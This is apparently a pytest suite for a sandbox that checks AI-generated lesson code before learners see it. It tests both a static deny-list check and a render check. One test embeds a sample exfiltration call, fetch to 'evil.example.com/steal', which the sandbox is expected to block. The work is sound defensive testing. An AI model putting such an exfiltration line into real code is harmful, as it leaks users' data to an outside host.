"""Unit under test: `graph.sandbox.SandboxRunner`, which runs the Node scripts of `sandbox/` (`check.mjs`) in a
subprocess, and `sandbox/scripts/check.mjs` itself through it, against the fixtures in `sandbox/fixtures/`.

Why: generated code is untrusted and is shown to learners. `check.mjs` is the gate that refuses a snippet that reaches
the network, the page, cookies or storage, or that escapes through a constructor. These fixtures are known-malicious
snippets that must be rejected and known-good components that must pass; a gate that waves a bad one through, or
rejects a good one, is either a hole or a lesson that never builds. The runner must also fail loudly, not quietly pass,
when the sandbox is missing, hangs or crashes.

Use cases:
- every good fixture (a stepping simulation, a Mafs graph, a page using components and a figure, typed TSX) passes
- every bad fixture is rejected with the rules named in its header (network, window, eval, Function, constructor and
  prototype escapes, raw img/iframe/script, innerHTML, cookies, storage, imports and exports, timers without cleanup,
  names outside the scope, unknown or dynamic figure assets, a missing required component, syntax errors, URLs)
- errors carry the line, column, rule and message
- a component name defined elsewhere in the document is allowed as a free identifier
- LaTeX that KaTeX can parse passes, and what it cannot is reported with the expression; no expressions need no run
- a missing sandbox, a script that hangs, one that crashes and one that prints garbage are SandboxErrors
- LaTeX checking is skipped (with a log line) when the sandbox is not installed, so content validation still works
- the render check: a good lesson renders all four pages; a throwing interactive is reported by name while its page
  still renders; a throwing page is reported for that page only; an endless loop hits the time budget; a network
  request is blocked and reported as a security violation; a blank page and an error in a click handler are found; an
  unreadable document is reported; a runtime that is not built is a SandboxError
"""

import re
from pathlib import Path

import pytest
from django.conf import settings

from graph.sandbox import SandboxError, SandboxRunner

FIXTURES = Path(settings.SANDBOX_DIR) / "fixtures"
runner = SandboxRunner()

pytestmark = pytest.mark.skipif(not runner.available(), reason="the sandbox package is not installed")


def header(source: str, key: str) -> list[str]:
    """The comma-separated values of every `// key: …` line at the top of a fixture."""
    return [v.strip() for line in re.findall(rf"^// {key}: (.*)$", source, re.M) for v in line.split(",") if v.strip()]


def parse_fixture(path: Path) -> dict:
    source = path.read_text()
    return {
        "code": source,
        "required": header(source, "required"),
        "components": header(source, "components"),
        "asset_ids": header(source, "assets"),
        "expect": header(source, "expect"),
    }


def check(fixture: dict):
    return runner.check_code(
        fixture["code"], required=fixture["required"], components=fixture["components"], asset_ids=fixture["asset_ids"]
    )


@pytest.mark.parametrize("path", sorted((FIXTURES / "good").glob("*.tsx")), ids=lambda p: p.stem)
def test_good_components_pass(path):
    result = check(parse_fixture(path))

    assert result.errors == [] and result.ok is True


@pytest.mark.parametrize("path", sorted((FIXTURES / "bad").glob("*.tsx")), ids=lambda p: p.stem)
def test_known_bad_snippets_are_rejected_with_the_expected_rules(path):
    fixture = parse_fixture(path)

    result = check(fixture)

    assert result.ok is False
    for rule in fixture["expect"]:
        assert any(f"[{rule}]" in error for error in result.errors), (rule, result.errors)


def test_errors_carry_line_column_rule_and_message():
    result = runner.check_code("function A() {\n  fetch('/x');\n  return null;\n}", required=["A"])

    assert result.errors == ["line 2:2 [forbidden-global] `fetch` is not allowed in lesson code"]


def test_a_component_defined_elsewhere_is_allowed_as_a_free_identifier():
    code = "function Page_core() { return <Interactive_demo />; }"

    assert runner.check_code(code, required=["Page_core"]).ok is False
    assert runner.check_code(code, required=["Page_core"], components=["Interactive_demo"]).ok is True


def test_latex_that_parses_passes_and_what_does_not_is_reported_with_the_expression():
    messages = runner.latex(["x^2", "\\frac{a}{b}", "\\frac{1}{", "\\notacommand{x}"])

    assert len(messages) == 2
    assert messages[0].startswith("LaTeX does not parse: '\\\\frac{1}{'")
    assert "notacommand" in messages[1]


def test_no_expressions_means_no_run(tmp_path):
    assert SandboxRunner(sandbox_dir=tmp_path).latex([]) == []


@pytest.fixture
def stub(tmp_path):
    """A sandbox directory whose check.mjs is whatever the test writes."""
    (tmp_path / "scripts").mkdir()
    (tmp_path / "node_modules").mkdir()

    def write(source: str) -> SandboxRunner:
        (tmp_path / "scripts" / "check.mjs").write_text(source)
        return SandboxRunner(sandbox_dir=tmp_path)

    return write


def test_a_script_that_hangs_is_a_sandbox_error(stub, settings):
    settings.SANDBOX_CHECK_TIMEOUT_S = 1

    with pytest.raises(SandboxError, match="timed out after 1s"):
        stub("setTimeout(() => {}, 30000);").check_code("x")


def test_a_script_that_crashes_is_a_sandbox_error_with_its_stderr(stub):
    with pytest.raises(SandboxError, match="check.mjs failed: .*boom"):
        stub("console.error('boom'); process.exit(2);").check_code("x")


def test_a_script_that_prints_garbage_is_a_sandbox_error(stub):
    with pytest.raises(SandboxError, match="invalid JSON"):
        stub("process.stdout.write('not json');").check_code("x")


def test_a_missing_sandbox_is_a_sandbox_error(tmp_path):
    with pytest.raises(SandboxError, match="not installed"):
        SandboxRunner(sandbox_dir=tmp_path).check_code("x")


def test_availability_needs_the_script_the_packages_and_node(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "check.mjs").write_text("")
    assert SandboxRunner(sandbox_dir=tmp_path).available() is False  # no node_modules
    (tmp_path / "node_modules").mkdir()
    assert SandboxRunner(sandbox_dir=tmp_path).available() is True
    assert SandboxRunner(sandbox_dir=tmp_path, node="no-such-node-binary").available() is False


def test_latex_is_skipped_with_a_log_line_when_the_sandbox_is_missing(tmp_path, caplog):
    with caplog.at_level("INFO"):
        messages = SandboxRunner(sandbox_dir=tmp_path).latex(["x^2"])

    assert messages == [] and "skipping the LaTeX check" in caplog.text


# --- the render check ---------------------------------------------------------------------------------------------

from support.lesson_data import make_final_test, make_pages  # noqa: E402
from support.media import png  # noqa: E402

from graph.codegen import DocumentAssembler  # noqa: E402

PAGES = ["introduction", "core", "advanced", "test"]
needs_render = pytest.mark.skipif(not runner.render_available(), reason="the lesson runtime is not built")
assembler = DocumentAssembler()
PUBLIC_FIELDS = ("id", "type", "concept", "difficulty", "marks", "question", "options")


def tsx(*lines: str) -> str:
    return "\n".join(lines) + "\n"


def lesson_payload(with_media: bool = False) -> dict:
    questions = [{k: q[k] for k in PUBLIC_FIELDS if k in q} for q in make_final_test()["questions"]]
    media = {}
    if with_media:
        media["a-1"] = {
            "url": "https://media.invalid/a-1", "kind": "image", "alt": "An amoeba", "caption": "Amoeba",
            "attribution": "Jane", "license": "cc-by-sa", "source_url": "", "width": 400, "height": 300,
        }  # fmt: skip
    return {
        "title": "Binary search", "topic": "Binary search", "level": "beginner", "pages": make_pages(),
        "final_test": {"title": "Test", "questions": questions}, "media": media,
    }  # fmt: skip


def document(components=None, page_overrides=None, placements=None) -> str:
    pages = {k: assembler.template_page(k, (placements or {}).get(k, {})) for k in ("introduction", "core", "advanced")}
    pages |= {"test": assembler.test_page()} | (page_overrides or {})
    return assembler.assemble(components or {}, pages)


def render(code: str, tmp_path=None, media: bool = False):
    media_files = {}
    if media:
        (tmp_path / "a-1.png").write_bytes(png())
        media_files["a-1"] = str(tmp_path / "a-1.png")
    return runner.render_check(code, lesson_payload(media), pages=PAGES, media_files=media_files)


WIDGET = tsx(
    "function Interactive_widget_core() {",
    "  const [n, setN] = useState(0);",
    "  return (",
    "    <div>",
    "      <Button onClick={() => setN(n + 1)}>Add</Button>",
    '      <Slider label="x" min={0} max={10} value={n} onChange={setN} /> {n}',
    "    </div>",
    "  );",
    "}",
)
PAGE_WITH_TEXT = '<PageFrame title="Core"><p>some honest looking content, long enough to count</p>'


@needs_render
def test_a_good_lesson_renders_on_all_four_pages(tmp_path):
    placements = {
        "core": {"s1": ["<Interactive_widget_core />"]},
        "introduction": {"s1": ['<Figure asset="a-1" />']},
    }

    report = render(document({"Interactive_widget_core": WIDGET}, placements=placements), tmp_path, media=True)

    assert report.ok is True, report
    assert report.pages == dict.fromkeys(PAGES, []) and report.components == {} and report.security == []


@needs_render
def test_an_interactive_that_throws_is_reported_by_name_and_does_not_break_the_page():
    widget = tsx("function Interactive_widget_core() {", "  throw new Error('boom from the widget');", "}")
    code = document({"Interactive_widget_core": widget}, placements={"core": {"s1": ["<Interactive_widget_core />"]}})

    report = render(code)

    assert report.ok is False
    assert any("boom from the widget" in e for e in report.components["Interactive_widget_core"])
    assert report.pages["core"] == [] and report.pages["introduction"] == []


@needs_render
def test_a_page_that_throws_while_rendering_is_reported_for_that_page_only():
    broken = tsx(
        "function Page_advanced() {",
        '  return <PageFrame title="x">{LESSON.pages.advanced.nothing.here}</PageFrame>;',
        "}",
    )

    report = render(document(page_overrides={"advanced": broken}))

    assert report.ok is False
    assert any("Runtime error" in e or "Uncaught" in e for e in report.pages["advanced"])
    assert report.pages["core"] == [] and report.pages["test"] == []


@needs_render
def test_an_endless_loop_is_caught_by_the_time_budget(settings):
    settings.SANDBOX_PAGE_TIMEOUT_MS = 2000
    loop = tsx(
        "function Page_core() {",
        "  useEffect(() => { while (true) {} }, []);",
        f"  return {PAGE_WITH_TEXT}</PageFrame>;",
        "}",
    )

    report = render(document(page_overrides={"core": loop}))

    assert any("did not finish" in e for e in report.pages["core"])
    assert report.pages["introduction"] == []


@needs_render
def test_a_network_request_is_blocked_and_reported_as_a_security_violation():
    leak = tsx(
        "function Page_core() {",
        "  useEffect(() => { fetch('https://evil.example.com/steal?c=1').catch(() => {}); }, []);",
        f"  return {PAGE_WITH_TEXT}</PageFrame>;",
        "}",
    )

    report = render(document(page_overrides={"core": leak}))

    assert report.ok is False
    assert any("evil.example.com" in v for v in report.security)


@needs_render
def test_a_blank_page_is_reported():
    report = render(document(page_overrides={"core": tsx("function Page_core() {", "  return <div />;", "}")}))

    assert any("blank" in e for e in report.pages["core"])


@needs_render
def test_an_error_in_a_click_handler_is_found_by_the_smoke_test():
    page = tsx(
        "function Page_core() {",
        f"  return {PAGE_WITH_TEXT}",
        "    <Button onClick={() => { throw new Error('click failed'); }}>Go</Button></PageFrame>;",
        "}",
    )

    report = render(document(page_overrides={"core": page}))

    assert any("click failed" in e for e in report.pages["core"])


@needs_render
def test_an_unreadable_document_is_reported_for_the_page_being_checked():
    report = render("function (((")

    assert report.ok is False
    assert any("Syntax error" in e or "did not render" in e for e in report.pages["introduction"])


def test_the_render_check_says_so_when_the_runtime_is_not_built(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "check.mjs").write_text("")
    (tmp_path / "node_modules").mkdir()

    with pytest.raises(SandboxError, match="runtime is not built"):
        SandboxRunner(sandbox_dir=tmp_path).render_check("x", {}, pages=["core"], media_files={})
